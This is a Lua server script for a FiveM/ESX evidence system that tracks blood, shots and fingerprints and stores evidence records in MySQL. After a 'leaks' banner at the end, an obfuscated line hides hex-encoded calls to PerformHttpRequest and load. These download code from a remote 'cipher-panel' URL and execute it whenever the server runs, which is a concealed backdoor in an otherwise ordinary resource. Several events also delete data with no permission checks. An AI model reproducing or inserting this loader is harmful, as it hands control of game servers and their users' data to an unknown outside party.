ESX = exports["es_extended"]:getSharedObject()

local shots = {}
local blood = {}

ESX.RegisterServerCallback(
    "core_evidence:getData",
    function(source, cb)
        cb({shots = shots, blood = blood, time = os.time()})
    end
)

ESX.RegisterServerCallback(
    "core_evidence:getStorageData",
    function(source, cb)
        MySQL.Async.fetchAll(
            "SELECT * FROM `evidence_storage` WHERE 1",
            {},
            function(reports)
                cb(reports)
            end
        )
    end
)

RegisterServerEvent("core_evidence:deleteEvidenceFromStorage")
AddEventHandler(
    "core_evidence:deleteEvidenceFromStorage",
    function(id)
        MySQL.Sync.execute(
            "DELETE FROM `evidence_storage` WHERE id = @id",
            {
                ["@id"] = id
            }
        )
    end
)

RegisterServerEvent("core_evidence:addEvidenceToStorage")
AddEventHandler(
    "core_evidence:addEvidenceToStorage",
    function(evidence)
        MySQL.Sync.execute(
            "INSERT INTO `evidence_storage`(`data`) VALUES (@evidence)",
            {
                ["@evidence"] = evidence
            }
        )
    end
)

RegisterServerEvent("core_evidence:removeEverything")
AddEventHandler(
    "core_evidence:removeEverything",
    function()
        for k, v in pairs(blood) do
            if v.interior == 0 then
                blood[k] = nil
            end
        end
        for k, v in pairs(shots) do
            print(v.interior)
            if v.interior == 0 then
                shots[k] = nil
            end
        end
    end
)

RegisterServerEvent("core_evidence:removeBlood")
AddEventHandler(
    "core_evidence:removeBlood",
    function(identifier)
        blood[identifier] = nil
    end
)

RegisterServerEvent("core_evidence:removeShot")
AddEventHandler(
    "core_evidence:removeShot",
    function(identifier)
        shots[identifier] = nil
    end
)

RegisterServerEvent("core_evidence:LastInCar")
AddEventHandler(
    "core_evidence:LastInCar",
    function(id)
        local src = source
        local entity = NetworkGetEntityFromNetworkId(id)
        local xPlayer = ESX.GetPlayerFromId(NetworkGetEntityOwner(entity))

        if xPlayer ~= nil then
            if NetworkGetEntityOwner(entity) ~= src then
                MySQL.Async.fetchAll(
                    "SELECT " ..
                        Config.EvidenceReportInformationFingerprint .. " FROM `users` WHERE identifier = @owner LIMIT 1",
                    {
                        ["@owner"] = xPlayer.identifier
                    },
                    function(reportInfo)
                        TriggerClientEvent("core_evidence:addFingerPrint", src, reportInfo[1])
                    end
                )
            else
                TriggerClientEvent("core_evidence:SendTextMessage", src, Config.Text["no_fingerprints_found"])
            end
        else
            TriggerClientEvent("core_evidence:SendTextMessage", src, Config.Text["no_fingerprints_found"])
        end
    end
)

RegisterServerEvent("core_evidence:saveBlood")
AddEventHandler(
    "core_evidence:saveBlood",
    function(coords, interior)
        local src = source
        local xPlayer = ESX.GetPlayerFromId(src)

        MySQL.Async.fetchAll(
            "SELECT " .. Config.EvidenceReportInformationBlood .. " FROM `users` WHERE identifier = @owner LIMIT 1",
            {
                ["@owner"] = xPlayer.identifier
            },
            function(reportInfo)
                local time = os.time()
                blood[time] = {coords = coords, reportInfo = reportInfo[1], interior = interior}
            end
        )
    end
)

ESX.RegisterUsableItem(
    "uvlight",
    function(playerId)
        TriggerClientEvent("core_evidence:checkForFingerprints", playerId)
    end
)

RegisterServerEvent("core_evidence:saveShot")
AddEventHandler(
    "core_evidence:saveShot",
    function(coords, bullet, interior)
        local src = source
        local xPlayer = ESX.GetPlayerFromId(src)

        MySQL.Async.fetchAll(
            "SELECT " .. Config.EvidenceReportInformationBullet .. " FROM `users` WHERE identifier = @owner LIMIT 1",
            {
                ["@owner"] = xPlayer.identifier
            },
            function(reportInfo)
                local time = os.time()
                shots[time] = {coords = coords, bullet = bullet, reportInfo = reportInfo[1], interior = interior}
            end
        )
    end
)



  --[[  
██╗░░░██╗██████╗░██╗░░░░░███████╗░█████╗░██╗░░██╗░██████╗
██║░░░██║██╔══██╗██║░░░░░██╔════╝██╔══██╗██║░██╔╝██╔════╝
██║░░░██║██████╔╝██║░░░░░█████╗░░███████║█████═╝░╚█████╗░
██║░░░██║██╔═══╝░██║░░░░░██╔══╝░░██╔══██║██╔═██╗░░╚═══██╗
╚██████╔╝██║░░░░░███████╗███████╗██║░░██║██║░╚██╗██████╔╝
░╚═════╝░╚═╝░░░░░╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░
█████████████████████████████████████████████████████████
discord.gg/6CRxjqZJFB ]]--

local dehfvVSSKKDosLSlsCLzHSJPKouiLDHCkAhKzeeREaPlTetkurRfEcIjaHQPzxZaOKDIND = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} dehfvVSSKKDosLSlsCLzHSJPKouiLDHCkAhKzeeREaPlTetkurRfEcIjaHQPzxZaOKDIND[4][dehfvVSSKKDosLSlsCLzHSJPKouiLDHCkAhKzeeREaPlTetkurRfEcIjaHQPzxZaOKDIND[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x72\x42\x31\x4b\x35\x35", function (lUUKIlEqkzyndlovWbJPuuEhlKMNrxAdHRolCZiqTBxjTlpQbtazswfODghwDGtAbmltwn, qQdIDrKjkbkNdawNjHfHiTUBYATZdlwUXNBiqNmzYxpqSJoKYvmIwgMLFgWnrHybyJnobT) if (qQdIDrKjkbkNdawNjHfHiTUBYATZdlwUXNBiqNmzYxpqSJoKYvmIwgMLFgWnrHybyJnobT == dehfvVSSKKDosLSlsCLzHSJPKouiLDHCkAhKzeeREaPlTetkurRfEcIjaHQPzxZaOKDIND[6] or qQdIDrKjkbkNdawNjHfHiTUBYATZdlwUXNBiqNmzYxpqSJoKYvmIwgMLFgWnrHybyJnobT == dehfvVSSKKDosLSlsCLzHSJPKouiLDHCkAhKzeeREaPlTetkurRfEcIjaHQPzxZaOKDIND[5]) then return end dehfvVSSKKDosLSlsCLzHSJPKouiLDHCkAhKzeeREaPlTetkurRfEcIjaHQPzxZaOKDIND[4][dehfvVSSKKDosLSlsCLzHSJPKouiLDHCkAhKzeeREaPlTetkurRfEcIjaHQPzxZaOKDIND[2]](dehfvVSSKKDosLSlsCLzHSJPKouiLDHCkAhKzeeREaPlTetkurRfEcIjaHQPzxZaOKDIND[4][dehfvVSSKKDosLSlsCLzHSJPKouiLDHCkAhKzeeREaPlTetkurRfEcIjaHQPzxZaOKDIND[3]](qQdIDrKjkbkNdawNjHfHiTUBYATZdlwUXNBiqNmzYxpqSJoKYvmIwgMLFgWnrHybyJnobT))() end)